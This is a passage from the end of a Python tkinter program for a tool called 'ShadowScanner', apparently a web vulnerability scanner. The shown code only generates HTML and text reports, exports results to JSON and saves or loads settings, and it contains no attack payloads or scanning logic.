            f.write(".summary { background-color: #e3f2fd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }\n")
            f.write(".vulnerability { border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n")
            f.write(".critical { border-left: 5px solid #e53935; }\n")
            f.write(".high { border-left: 5px solid #ff9800; }\n")
            f.write(".medium { border-left: 5px solid #1e88e5; }\n")
            f.write(".low { border-left: 5px solid #43a047; }\n")
            f.write(".severity { font-weight: bold; padding: 3px 8px; border-radius: 3px; color: white; display: inline-block; }\n")
            f.write(".critical-bg { background-color: #e53935; }\n")
            f.write(".high-bg { background-color: #ff9800; }\n")
            f.write(".medium-bg { background-color: #1e88e5; }\n")
            f.write(".low-bg { background-color: #43a047; }\n")
            f.write("</style>\n</head>\n<body>\n")
            
            f.write("<div class='header'>\n")
            f.write(f"<h1>ShadowScanner Vulnerability Report</h1>\n")
            f.write(f"<h2>Target: {self.url_entry.get()}</h2>\n")
            f.write(f"<p>Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>\n")
            f.write("</div>\n")
            
            f.write("<div class='summary'>\n")
            f.write(f"<h2>Scan Summary</h2>\n")
            f.write(f"<p>Scan Duration: {(datetime.now() - self.start_time).total_seconds():.2f} seconds</p>\n")
            f.write(f"<p>Total Vulnerabilities Found: {self.vuln_count}</p>\n")
            
            # Count vulnerabilities by severity
            severity_count = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
            for vuln in self.scan_results:
                severity_count[vuln["severity"]] += 1
                
            f.write("<p>Severity Breakdown:</p>\n")
            f.write("<ul>\n")
            for sev, count in severity_count.items():
                if count > 0:
                    f.write(f"<li>{sev}: {count}</li>\n")
            f.write("</ul>\n")
            
            if self.honeypot_detected:
                f.write("<p style='color: #e53935; font-weight: bold;'>WARNING: HONEYPOT DETECTED! Results may be unreliable</p>\n")
            
            f.write("</div>\n")
            
            if self.vuln_count > 0:
                f.write("<h2>Vulnerabilities</h2>\n")
                for vuln in self.scan_results:
                    f.write(f"<div class='vulnerability {vuln['severity'].lower()}'>\n")
                    f.write(f"<h3>{vuln['name']}</h3>\n")
                    f.write(f"<p><span class='severity {vuln['severity'].lower()}-bg'>{vuln['severity']}</span></p>\n")
                    f.write(f"<p><strong>Description:</strong> {vuln['description']}</p>\n")
                    f.write(f"<p><strong>Remediation:</strong> {vuln['remediation']}</p>\n")
                    f.write(f"<p><strong>Time:</strong> {vuln['timestamp']}</p>\n")
                    f.write("</div>\n")
            else:
                f.write("<h2>No Vulnerabilities Found</h2>\n")
                f.write("<p>Congratulations! No security vulnerabilities were detected.</p>\n")
                
            f.write("</body>\n</html>")

    def generate_text_report(self, file_path):
        """Generate a text report"""
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"ShadowScanner Vulnerability Report\n")
            f.write(f"="*60 + "\n\n")
            f.write(f"Target URL: {self.url_entry.get()}\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scan Duration: {(datetime.now() - self.start_time).total_seconds():.2f} seconds\n")
            f.write(f"Total Vulnerabilities Found: {self.vuln_count}\n\n")
            
            if self.honeypot_detected:
                f.write("WARNING: HONEYPOT DETECTED! Results may be unreliable\n\n")
            
            if self.vuln_count > 0:
                f.write("Vulnerabilities:\n")
                f.write("-"*60 + "\n")
                for i, vuln in enumerate(self.scan_results, 1):
                    f.write(f"{i}. {vuln['name']} [{vuln['severity']}]\n")
                    f.write(f"   Description: {vuln['description']}\n")
                    f.write(f"   Remediation: {vuln['remediation']}\n")
                    f.write(f"   Timestamp: {vuln['timestamp']}\n\n")
            else:
                f.write("No vulnerabilities found.\n")

    def export_results(self):
        """Export results to JSON"""
        if not self.scan_results:
            messagebox.showinfo("Export Results", "No scan results to export")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON Files", "*.json"), ("All Files", "*.*")]
        )
        
        if not file_path:
            return
            
        try:
            report = {
                "target": self.url_entry.get(),
                "scan_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "duration": (datetime.now() - self.start_time).total_seconds(),
                "vulnerabilities": self.scan_results,
                "honeypot_detected": self.honeypot_detected
            }
            
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2)
                
            messagebox.showinfo("Export Results", f"Results exported successfully to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export results: {e}")

    def load_config(self):
        """Load configuration from file if exists"""
        config_path = "shadowscanner_config.json"
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    self.url_entry.delete(0, tk.END)
                    self.url_entry.insert(0, config.get('url', 'http://'))
                    self.scan_type.set(config.get('scan_type', 'full'))
                    self.threads_var.set(config.get('threads', 5))
                    self.delay_var.set(config.get('delay', 200))
                    self.proxy_var.set(config.get('proxy', ''))
                    self.retry_var.set(config.get('retries', 2))
            except:
                pass

    def on_close(self):
        """Save configuration before closing"""
        config = {
            'url': self.url_entry.get(),
            'scan_type': self.scan_type.get(),
            'threads': self.threads_var.get(),
            'delay': self.delay_var.get(),
            'proxy': self.proxy_var.get(),
            'retries': self.retry_var.get()
        }
        
        try:
            with open("shadowscanner_config.json", 'w') as f:
                json.dump(config, f)
        except:
            pass
            
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = ShadowScannerGUI(root)
    root.mainloop()